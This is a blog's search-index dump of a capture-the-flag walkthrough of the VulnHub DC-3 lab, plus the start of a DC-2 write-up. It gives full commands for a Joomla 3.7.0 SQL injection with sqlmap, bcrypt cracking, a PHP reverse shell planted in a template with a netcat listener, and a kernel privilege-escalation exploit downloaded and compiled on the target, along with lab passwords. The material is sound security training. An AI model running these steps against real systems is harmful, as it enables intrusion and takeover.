[{"categories":["VulnHub"],"content":"DC-3 from the DC-Series(VulnHub).","date":"11-21-2023","objectID":"/dc-3/","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"I enjoyed DC-2’s Tom \u0026 Jerry theme! It showed us the concept of credential reuse and weak passwords, along with the misconfigurations of wordpress and SUID set binary. Anyways, now onto DC-3.2 aka DC-3! ","date":"11-21-2023","objectID":"/dc-3/:0:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"DC-3 Details Dropdown to see DC-3's quick overview DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all. Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools. For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won’t give you the answer, instead, I’ll give you an idea about how to move forward. For those with experience doing CTF and Boot2Root challenges, this probably won’t take you long at all (in fact, it could take you less than 20 minutes easily). If that’s the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag. Details can be found at https://www.five86.com/dc-3.html ","date":"11-21-2023","objectID":"/dc-3/:1:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Obtaining DC-3’s IP \u0026 Set Vars Depending on your lab environment, the way DC-3 is assigned an IP address will vary. In my current layout, I have DC-3 being hosted, through virtualbox, on a host-only adapter. This host-only network has a virtualbox DHCP server running at 192.168.56.100 and this assigns DC-3 it’s IP address: 192.168.56.113. Running sudo netdiscover -i vboxnet0 -r 192.168.56.0/24 provides me the following result. -i vboxnet0 –\u003e is the host-only interface, created by virtualbox, in which DC-3 exists. I then follow up by assigning a few variables and echoing them back to review for syntax errors. netdiscover followed by var assignment \u0026 echo ","date":"11-21-2023","objectID":"/dc-3/:2:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Scanning and Enumeration With DC-3’s IP found and a few environmental variables set, let’s move onto scanning with nmap. ","date":"11-21-2023","objectID":"/dc-3/:3:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Scanning with nmap Let’s see what ports and services may be running on the target(DC-3). nmap $IP -T4 -p- -sC -sV --open $IP –\u003e is the previously exported IP address of DC-3. -T4 –\u003e T1(slowest) thru T5(fastest), T3 is the default speed. If you leave this option out, the scan will run at a default T3 speed. More can be learned at Nmap’s Timing Templates webpage. -p- –\u003e tells nmap to scan ALL 65,535 TCP ports. -sC –\u003e specifies nmap to run default scripts. -A includes this. -sV –\u003e enables version detection. -A includes this. --open –\u003e only shows ports that are “open”. Safe against a purposely vulnerable box. Using -A works too. It includes the two specified options above, plus traceroute. trimmed up nmap results Looks like a Joomla CMS provided by an apache server hosted on Ubuntu. Let’s make some notes and move onto manual inspection. ","date":"11-21-2023","objectID":"/dc-3/:3:1","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Notes \u0026 Try-List Box Name : DC-3 (DC Series) OS : Ubuntu (Linux) IP : 192.168.56.113 Ports / Services 80 : Apache httpd 2.4.18 80 : Joomla v x.x??? Try List –\u003e Manual Inspection(view source, robots.txt, etc) –\u003e fuzz directories/files –\u003e joomscan –\u003e Manual Inspection : Fuzzing Files : Fuzzing Dirs : joomscan results : ","date":"11-21-2023","objectID":"/dc-3/:3:2","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Manual Inspection Browsing to 192.168.56.113 provides us the Joomla home page. QUICK TRY LIST: Default creds? –\u003e Failed admin:admin Username/Email Enum possible? –\u003e Failed. Same responses Robots.txt doesn’t exist. View Page Source –\u003e Nothing worth noting joomla home page Nothing obvious with the manual inspection, so let’s move onto fuzzing directories and files… ","date":"11-21-2023","objectID":"/dc-3/:3:3","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Fuzzing Files Let’s see if the Joomla CMS has any files that are hidden or forgotten… wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 403,404 $URLfile -c –\u003e provides a color output for the webapp’s response column. -z file,/*wordlist* –\u003e specifies payload type and points to file wordlist. --hc 403,404 –\u003e tells wfuzz not to display any 403 or 404 responses. $URLfile –\u003e is the exported variable with no appended backslash, meaning wfuzz will fuzz for files. wfuzz - files Let’s manually visit each recorded response, in our browser, to see what each presents! index.php - that’s the home page… LICENSE.txt - nothing worth notating configuration.php - located in the root directory.. this provides Joomla needed parameters to properly run. db locations, settings, etc BUT we can’t access it. Not helpful for now but maybe we enum once we get access… README.txt - provides a Joomla version of 3.7.0 - add that to our notes! htaccess.txt - file that specifies access control settings Well, we were able to enumerate Joomla’s versioning. 3.7.0! Time to enumerate the directories. ","date":"11-21-2023","objectID":"/dc-3/:3:4","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Fuzzing Directories Just like before but with the $URLdir variable and directories.txt wordlist. We’ll also add the option --hh 31, as this will filter out some responses that have no value to us(blank pages,forbidden,etc). wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 403,404 --hh 31 $URLdir wfuzz - directories Again, just as before. Let’s visit the response…/administrator/ Looks like an admin login page but with no usernames, attempting to login would be a waste. ","date":"11-21-2023","objectID":"/dc-3/:3:5","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Updating our notes Box Name : DC-3 (DC Series) OS : Ubuntu (Linux) IP : 192.168.56.113 Ports / Services 80 : Apache httpd 2.4.18 80 : Joomla v3.7.0 Try List –\u003e joomscan Manual Inspection : Nothing worthy Fuzzing Files : README.txt provides versioning 3.7.0 Fuzzing Dirs : /administrator/ provides admin login form joomscan : ","date":"11-21-2023","objectID":"/dc-3/:3:6","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Enum/Vuln scan with joomscan joomscan, an OWASP project, is aimed at automating vulnerability detection of Joomla CMS deployments. Please see OWASP’s joomscan github for more information. It’s very simple to run, but let’s go ahead and export an environment variable called URLjoomscan.(It’s good practice, that’s why!) export URLjoomscan=\"http://192.168.56.113/\" Now let’s run joomscan joomscan -u $URLjoomscan We get a version confirmation of 3.7.0. It also shows there’s no Joomla core vulnerability but this isn’t true. The next section will show otherwise. Confirming a tool’s findings is an important step, as you’ll sometimes run into false results! Joomla 3.7.0 and admin login page - confirmed ","date":"11-21-2023","objectID":"/dc-3/:3:7","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Researching Exploits We’re not at a dead-end but since we have a confirmed version of Joomla 3.7.0, let’s go ahead and search exploit-db.com database which is searchable locally using searchsploit. searchsploit (AKA local repo of exploit-db.com) isn’t the only option and shouldn’t be. I don’t document it on these posts, but I do spend time on google researching exploits. Searchsploit isn’t the end all of finding an exploit. There’s many hidden gems out there! See my resources pages for more exploit resources! ","date":"11-21-2023","objectID":"/dc-3/:4:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Searchsploit joomla 3.7 searchsploit joomla 3.7 results in the following(see pic) searchsploit 3.7 results There’s two helpful options we can use to interact with the searchsploit results: -m aka --mirror - this copies an exploit to the current working directory. -x aka --examine - this displays the exploit contents in the terminal. I’ll be using the -m option to copy the file to the current working directory. Since there’s two exploits I’m interested in, I’ll copy each. searchsploit -m php/remote/44227.php \u0026\u0026 searchsploit -m php/webapps/42033.txt After looking at both exploits, the 44227.php file concatenates the joomla database tables for usernames, emails, dbusers, dbnames, dbversion while the 42033.txt file just shows a few SQLi examples. One example is through sqlmap! I want to get more experience using sqlmap, so this will be the path I take. The vulnerability, in Joomla, looks to relate to the com_fields component being accessible by the public but is also used for internal administrative use. We’ll be abusing this… You can test for SQL injection by simply running the following in your browser http://*DC-3-IP*/index.php?option=com_fields\u0026view=fields\u0026layout=modal\u0026list[fullordering]=%27 If you get this response, then it’s vulnerable to SQLi (SQL Injection)! Confirming SQLi for Joomla 3.7.0 ","date":"11-21-2023","objectID":"/dc-3/:4:1","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Exploiting Again, I’ll be using sqlmap to dump data from the Joomla SQL DB but feel free to approach this how you’d like! That’s part of the fun! ","date":"11-21-2023","objectID":"/dc-3/:5:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Running sqlmap against Joomla DB File 42033.txt gives us this example to run, so let’s try it out. sqlmap -u \"http://localhost/index.php?option=com_fields\u0026view=fields\u0026layout=modal\u0026list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] You’ll want to replace “localhost” with DC-3’s IP address. -u –\u003e specifies the URL in which we’re attacking. We need to include the entire syntax of the com_fields address as it’s the exploit we’re abusing. --risk=3 –\u003e basically runs most(loudest) tests. We’re not being stealthy, so it’s OK. --level=5 –\u003e provides us a higher level of verbose --dbs –\u003e Enumerates DBMS databases --p list[fullordering] –\u003e the output format Just hit enter to run defaults if you’re asked any questions during runtime. MySQL - databases mysql confirmed MySQL version \u003e=5.1. Add this to the notes! This results in a list of the databases in the MySQL server. Let’s now specify the database we want to enumerate using the options and value -D joomladb and list out its tables. sqlmap -u \"http://localhost/index.php?option=com_fields\u0026view=fields\u0026layout=modal\u0026list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering] Remove --dbs and add -D joomladb - this specifies the “joomladb” database we want to query aka “USE DATABASE joomla;” Add --tables –\u003e this basically runs “SHOW tables;” MySQL - joomladb tables It’s a longer list, but we’re seeing a #__users table. Let’s go ahead and --dump it’s data. sqlmap -u \"http://localhost/index.php?option=com_fields\u0026view=fields\u0026layout=modal\u0026list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent -D joomladb -T \"#__users\" --dump -p list[fullordering] Replace --tables with -T \"#__users\" –\u003e this specifies the table Add option --dump –\u003e this will dump all the data in the #__users table. It might ask “do you want to use common column existence check”.. answer y When asked about which dictionary to use, default #1 is fine. 1 thread is fine. Press enter to run the default speed. MySQL Table Dump! Nice! We end up with a dump showing the details of the username admin, including the password hash! ","date":"11-21-2023","objectID":"/dc-3/:5:1","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Cracking hashes with hashcat Before we can crack the hash, we need to do two things. Move the hash into a file for hashcat. Figure out what hash algorithm was used. Let’s place $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu into a file, so we can feed it to hashcat echo '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' \u003e dc-3-mysql-hash-dump.txt After researching the hash on google, I found that hashes starting with $2y$ are bcrypt. We tell hashcat it’s bcrypt with option -m 3200 Now that we know the hashing algorithm and the hash is inside a file, let’s run hashcat! hashcat -m 3200 -a 0 dc-3-mysql-hash-dump.txt /usr/share/wordlists/rockyou.txt -m 3200 –\u003e specifies bcrypt hash algorithm -a 0 –\u003e tells hashcat to run a straight attack, it runs against each word in the dictionary without character alteration *.txt –\u003e is the files containing the hashes /*/wordlist.txt –\u003e specifies the location of the wordlist Username admin hash cracked!! We now have an email, username, and password! Let’s update our notes! Plus MySQL versioning and potential username:freddy. ","date":"11-21-2023","objectID":"/dc-3/:5:2","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Updating our notes again Box Name : DC-3 (DC Series) OS : Ubuntu (Linux) IP : 192.168.56.113 Ports / Services 80 : Apache httpd 2.4.18 80 : Joomla v3.7.0 Manual Inspection : Nothing worthy Fuzzing Files : README.txt provides versioning 3.7.0 Fuzzing Dirs : /administrator/ provides admin login form joomscan : confirmed versioning 3.7.0 ADDITIONAL SERVICES MySQL - \u003e= 5.1 EMAILS freddy@norealaddress[.]net CREDENTIALS admin:snoopy - Joomla POTENTIAL USERNAMES freddy ","date":"11-21-2023","objectID":"/dc-3/:5:3","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Logging into Joomla as admin Head to /administrator/ login form and use our newly cracked password –\u003e admin:snoopy. Logged in as admin - Joomla We’re now logged into Joomla as admin! At this point, it’s good to look around the admin panel to see what there is to notate. Versions? Other users? Anything! A good place to start, with Joomla, is in the System \u003e System Information panel Joomla’s configuration panel Although a back burner item, notating the kernel version is important as it may be the last easy way to gaining privesc. I found the following information and added them to the notes. Kernel –\u003e Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 Ubuntu –\u003e 5.7.25-0ubuntu0.16.04.2 PHP Version –\u003e 7.0.33-0ubuntu0.16.04.2 Apache –\u003e Apache/2.4.18 (Ubuntu) Server API–\u003e Apache2Handler 20120211 Zend Engine –\u003e v3.0.0 MySQL –\u003e 5.0.12-dev OpenSSL –\u003e 1.0.2g Box Name : DC-3 (DC Series) Kernel/OS : Ubuntu (Linux) Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 – 5.7.25-0ubuntu0.16.04.2 IP : 192.168.56.113 Ports / Services 80 : Apache httpd 2.4.18 80 : Joomla v3.7.0 Manual Inspection : Nothing worthy Fuzzing Files : README.txt provides versioning 3.7.0 Fuzzing Dirs : /administrator/ provides admin login form joomscan : confirmed versioning 3.7.0 ADDITIONAL SERVICES MySQL –\u003e 5.0.12-dev PHP –\u003e 7.0.33-0ubuntu0.16.04.2 Apache2Handler –\u003e 20120211 Zend Engine –\u003e 3.0.0 OpenSSL –\u003e 1.0.2g EMAILS freddy@norealaddress[.]net CREDENTIALS admin:snoopy - Joomla POTENTIAL USERNAMES freddy Now that we have admin access, will it allow us to inject malicious php code into the php forms? ","date":"11-21-2023","objectID":"/dc-3/:5:4","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"reverse-shell against a template I quickly found two possible ways to gain reverse shells through PHP. Upload option located at Content \u003e Media (there may be upload restrictions you have to get around. See Content \u003e Media \u003e Options) php templates in Extension \u003e Templates \u003e Templates With the Content \u003e Media option, you’d want to upload the reverse shell(revshell) then somehow execute it.. This can be done by visiting the file by simply accessing it e.g. http://192.168.56.113/images/malicious-file.extension Option two is done by simply pasting pentestmonkey’s php-revshell code into a template and previewing it. aka the contents of the .php file you’d use for option #1 is executed when Joomla previews(executes) the code. I’ll go the template route. Navigate to the Beez3 template by Extensions \u003e Templates \u003e Templates \u003e Beez3 Details and Files index.php then paste revshell over the existing data. Edit the $ip and $port variables to match your attack system’s IP and the port you’d like to use. e.g. 1234. ⚠️ DO NOT SAVE \u0026 PREVIEW the template yet! Netcat needs configured PHP revshell configured and ready! Now it’s time to setup netcat, so it’s listening on the port you previously specified in the php template. Open another terminal tab and run: nc -nvlp 1234 n –\u003e uses IP addressing and not DNS v –\u003e verbose mode l –\u003e tells nc to listen p –\u003e specifies the port e.g. 1234 Now that we have nc listening, it’s time to get a revshell! Jump back to Joomla and click “Save \u0026 Close” followed by clicking “Template Preview”. We have remote shell! Successful revshell ","date":"11-21-2023","objectID":"/dc-3/:5:5","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Post-Exploitation Now that we have a revshell, we’ll want to establish a stable shell that has tty and continue enumeration, search for privesc exploits/abuses, and finally gain root. ","date":"11-21-2023","objectID":"/dc-3/:6:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Upgrading shell incl. tty Let’s check for tty. Nope. Let’s check for restricted shell by running a few commands… ls cd / echo. No rbash! So let’s get us a stable shell with tty. Thanks to S1ren’s blog! Let’s check for python… with which python. Sweet. Let’s spawn a python shell! python -c 'import pty; pty.spawn(\"/bin/bash\")' - this spawns a bash shell, with tty, through python Now let’s set PATH variables, output color, and an alias. export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp –\u003e export variables export TERM=xterm-256color –\u003e color in terminal alias ll='ls -lsaht --color=auto' –\u003e ll runs ls -lsaht Press Ctrl + Z to make our zhs shell a background process through netcat(nc) stty raw -echo;fg;reset then enter twice –\u003e input and output is not processed, e.g. can’t cancel shell by CTRL+C, then opens background shell with reset stty columns 200 rows 200 –\u003e this sets columns and rows to max on terminal output Now CTRL+C won’t disconnect us and we have nice terminal output. 😃 A stable python spawned bash shell with tty ","date":"11-21-2023","objectID":"/dc-3/:6:1","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Checking for sudo privs Let’s see if we have sudo privs by running sudo -l.. well it’s asking for a password and snoopy does not work. So, we’ll either need to find user www-data’s password or find another privesc path. ","date":"11-21-2023","objectID":"/dc-3/:6:2","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"enum /etc/shadow \u0026 /etc/passwd Let’s see if we have access to cat /etc/shadow or cat /etc/passwd. Denied access to shadow but we have access to passwd. user dc3 found In linux, user created users start with an ID of 1000. e.g. 1000 and 1001 would indicate two users NOT including root. Root is always ID 0. Looks like we have a user to add to our notes: dc3 ","date":"11-21-2023","objectID":"/dc-3/:6:3","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Searching binaries w/ SUID bit set The SUID, Set User ID, is a feature that allows a binary to run under the permissions of another user. The abuse comes from administrators setting the SUID bit on binaries that are abusable and share root permissions. After we find the SUID binaries, we check them for abuse through an online reference like GTFOBins. To search the target for binaries which have the SUID bit set, we’ll run the following command: find / -perm -u=s -type f 2\u003e/dev/null find / –\u003e searches the root directory where the… -perm -u=s –\u003e permission, for the current user, is set to s “sticky bit” -type f –\u003e to only list files 2\u003e/dev/null –\u003e redirects any errors to a black hole in space 😁 SUID set binaries The at binary is abusable for privesc BUT it requires the user to have SUDO privs to the file and not SUID, so this is a dead end since we lack SUDO privs. ","date":"11-21-2023","objectID":"/dc-3/:6:4","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Looking for abusable cron jobs Let’s see what processes are running as ‘root’ by executing the following: ps -U root -u root u this shows every process running as root in user format. Pulled from ps man page. cron running as root I looked for anything abusable running under a cronjob but there was nothing. ","date":"11-21-2023","objectID":"/dc-3/:6:5","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Digging into /html root Let’s see if Joomla’s configuration file holds anything special… cat /var/www/html/configuration.php Looks like we found the root MySQL database password! root:squires MySQL creds found ","date":"11-21-2023","objectID":"/dc-3/:6:6","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Accessing MySQL db mysql -uroot -psquires We end up having root access to the MySQL database but nothing of value was found. ","date":"11-21-2023","objectID":"/dc-3/:6:7","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Updating \u0026 Reviewing Notes I tried using all combinations of username/passwords for su and got nowhere. The only other thing to check is the kernel. It may be exploitable. At this point, let’s gather all the kernel/OS info and add it to our notes, or confirm what we already have, so we can find the best possible exploit. file /bin/bash cat /etc/*-release uname -a This results in the following: Kernel \u0026 OS Info Box Name : DC-3 (DC Series) OS/Bit/Kernel : Ubuntu (Linux) 16.04, 32-bit LSB, 4.4.0-21-generic kernel IP : 192.168.56.113 Ports / Services 80 : Apache httpd 2.4.18 80 : Joomla v3.7.0 Manual Inspection : Nothing worthy Fuzzing Files : README.txt provides versioning 3.7.0 Fuzzing Dirs : /administrator/ provides admin login form joomscan : confirmed versioning 3.7.0 exfil of admin credentials via SQL injection command execution through php to gain remote shell ADDITIONAL SERVICES MySQL –\u003e 5.0.12-dev PHP –\u003e 7.0.33-0ubuntu0.16.04.2 Apache2Handler –\u003e 20120211 Zend Engine –\u003e 3.0.0 OpenSSL –\u003e 1.0.2g EMAILS freddy@norealaddress[.]net CREDENTIALS admin:snoopy - Joomla root:squires - MySQL POTENTIAL USERNAMES freddy , dc3 ","date":"11-21-2023","objectID":"/dc-3/:6:8","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Gaining root! The plan: We’re going to searchsploit, look for an exploit, figure out how to execute the exploit, execute the exploit, and hopefully gain root! ","date":"11-21-2023","objectID":"/dc-3/:7:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Searchsploit per OS/Kernel We’re going searchsploit the OS and kernel versions for any exploit that may give us privilege escalation, making sure it’s not a 64-bit exploit. searchsploit is picky with syntax. If you include too much in your search query, you might miss out on a result. e.g. searchsploit 4.4.0 may miss out on the result of 4.4.x since 0 was specified. Let’s run searchsploit ubuntu 16.04 4.4 priv esc This will look for any exploits that include ubuntu + 16.04 + 4.4 + priv + esc and we get the following results! searchsploit kernel exploit results I’m going to choose the linux/local/39772.txt and the chances of it working increase when seeing a “x” in the kernel results 4.4.*x*. Let’s copy the text file over to our current working directory. Since searchsploit copies files to the current working directory, please cd into desired directory before running: searchsploit -m linux/local/39772.txt. Now let’s nano 39772.txt to see the details of the exploit like what needs configured(if needed), how to execute, etc It looks like we need access to the following binaries, on the target machine, in order to execute the exploit. which wget –\u003e Found it! To transfer the exploit from attackbox to the target. which unzip –\u003e Found it! To unzip the 39772.zip file. which tar –\u003e Found it! To untar the exploit.tar file. which cc –\u003e Found it! To compile the *.c files. Sweet! We’re good to transfer, compile, and run the exploit. Let’s download the exploit to our attackbox. 😁 wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip I use vim to look inside the zip file and it holds the *.tar file needed to exploit the target: exploit.tar. The crasher.tar is the PoC, and is NOT needed. Good to know as we’ll need to unzip this archive, once on the target, and compile the exploit to run. Contents of 39772.zip Let’s now move onto transferring the exploit and executing it! ","date":"11-21-2023","objectID":"/dc-3/:7:1","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Transferring the exploit On the attackbox’s terminal, you’ll want to start up a http server, or any other quick file host app, to host the exploit, so the target can download it. I do this with python. python -m http.server –\u003e this will run a http server within the current working directory which is where I downloaded the 39772.zip file. Let’s hop back onto the target’s terminal and cd /var/tmp. I choose /var/tmp as it’ll preserve our exploit through reboots. I’m doing this in case the system crashes and its needed for a second run. Normally, we place exploits in /tmp since it’s cleared at reboot. When it comes to pentests, it’s important to clean up after yourself and revert any settings/changes that were made. Unless specified, you never want to leave changes in place as it might alter the operations of the business. Once in /var/tmp, we run the following to download the exploit from the attackbox. wget http://192.168.56.1:8000/39772.zip wget –\u003e is a simple network downloader that exists on most standard linux distros. http://192.168.56.1:8000/ –\u003e is my attackbox’s IP, along with the default port http.server uses 39772.zip –\u003e is the exploit we downloaded earlier. Here’s a successful transfer, of 39772.zip, from the attackbox to the target. Attackbox - file transfer successful 200 Targetbox - file transfer successful We can now ll, on the target’s terminal, and see that we have the file in the current working directory. ","date":"11-21-2023","objectID":"/dc-3/:7:2","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Exploiting Kernel 4.4.0-21-generic! Now that we have the kernel exploit on the target machine, we’re set to extract, compile, and execute. unzip 39772.zip –\u003e unzip folder’s contents into a folder with the same name “39772” cd 39772 –\u003e will change working directory into the “39722” folder, which contains the tar files ll –\u003e will show the two files, but we’ll only need to untar the exploit.tar file. tar -xvf exploit.tar –\u003e this untars the exploit.tar file. ll again –\u003e you’ll see a folder called “ebpf_mapfd_doubleput_exploit” cd ebpf_mapfd_doubleput_exploit –\u003e change directory into ebpf_mapfd_doubleput_exploit folder ll again –\u003e you’ll see a compile.sh file. This is the file that’ll compile, using cc, the exploit that we’ll execute. ./compile.sh –\u003e You may see some errors, and since they’re non critical we’ll ignore them. ll again –\u003e you should see a few new files. suidhelper, doubleput, and hello. exploit ready for execution! Now we have an exploit, called doubleput, that’s ready to be executed!! Let’s get to it already! ./doubleput –\u003e executes the exploit…. and… ","date":"11-21-2023","objectID":"/dc-3/:7:3","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"ROOTED!! ROOT GAINED!!! ","date":"11-21-2023","objectID":"/dc-3/:8:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Updating notes incl. attack process! Box Name : DC-3 (DC Series) OS/Bit/Kernel : Ubuntu (Linux) 16.04, 32-bit LSB, 4.4.0-21-generic kernel Priviledge Escalation gained by exploiting vulnerability in Linux Kernel 4.4.0-21-generic. Exploit used = Linux Kernel 4.4.x (Ubuntu 16.04) - ‘double-fdput()’ bpf(BPF_PROG_LOAD) Privilege Escalation IP : 192.168.56.113 Ports / Services 80 : Apache httpd 2.4.18 80 : Joomla v3.7.0 Manual Inspection : Nothing worthy Fuzzing Files : README.txt provides versioning 3.7.0(Info Disclosure) Fuzzing Dirs : /administrator/ provides admin login form joomscan : confirmed versioning 3.7.0 Exfil of Joomla’s admin hashed credential, through a SQL injection vulnerability in Joomla’s Core (Exploit used = Joomla! 3.7.0 - ‘com_fields’ SQL Injection), granted admin access to Joomla’s admin panel which allowed for remote code execution resulting in a reverse shell to DC-3. This php revshell RCE was accomplished through Joomla’s php templates. Once the reverse shell was established, we gained full access to the MySQL database after finding clear text root MySQL credentials within Joomla’s configuration file. To gain root privileges, we exploited DC-3’s vulnererable linux kernel by the above listed exploit, ‘double-fdput()’ ADDITIONAL SERVICES MySQL –\u003e 5.0.12-dev PHP –\u003e 7.0.33-0ubuntu0.16.04.2 Apache2Handler –\u003e 20120211 Zend Engine –\u003e 3.0.0 OpenSSL –\u003e 1.0.2g EMAILS freddy@norealaddress[.]net CREDENTIALS admin:snoopy - Joomla root:squires - MySQL USERNAMES dc3 - DC-3 ID=1000 POTENTIAL USERNAMES freddy ","date":"11-21-2023","objectID":"/dc-3/:8:1","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Thanks for visiting! I hope you enjoyed DC-3. Next, DC-4! ","date":"11-21-2023","objectID":"/dc-3/:9:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"DC-2 from the DC-Series(VulnHub).","date":"11-20-2023","objectID":"/dc-2/","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"With DC-1 out of the way, let’s move onto DC-2 of the DC Series! ","date":"11-20-2023","objectID":"/dc-2/:0:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"DC-2 Details Click here to see DC-2's quick overview. Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing. As with the original DC-1, it’s designed with beginners in mind. Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools. Just like with DC-1, there are five flags including the final flag. And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience. In short, the only flag that really counts, is the final flag. For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc. I haven’t explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install. Further details can be found at https://www.five86.com/dc-2.html. ","date":"11-20-2023","objectID":"/dc-2/:1:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Finding DC-2’s IP Once you’ve imported, configured, and started the DC-2 VM, let’s acquire its IP by running sudo netdiscover -r *IP*/*CIDR* from our attack box’s terminal. -r specifies the IP range by IP/CIDR notation. (There’s always another way to reach a similar outcome, so feel free to use your own techniques/tools to acquire DC-2’s IP address.) If you see two asterisks surrounding some characters, like *IP*, removal of the asterisks and inserting the appropriate characters is needed. In this case, *IP* and *CIDR* need replaced by the IP address(e.g. 192.168.56.0) and subnet mask shorthand via CIDR(/24), in which DC-2 exists, respectively. Depending on my attack system’s interface/routing configuration, I may have to run the netdiscover command with the -i option. -i specifies which interface I want the ARP requests to be sent through. As I’m running multiple NICs, a VPN, and virtualbox, on this particular attack box, I have to run the following command to grab DC-2’s IP: sudo netdiscover -i vboxnet0 -r 192.168.56.0/24 PS You’ll need to CTRL+C to exit netdiscover. netdiscover tool - *.100 is the virtualbox DHCP server while *.111 is DC-2 Now that we have DC-2’s IP address, let’s move onto setting up environment variables through the attack box’s terminal. 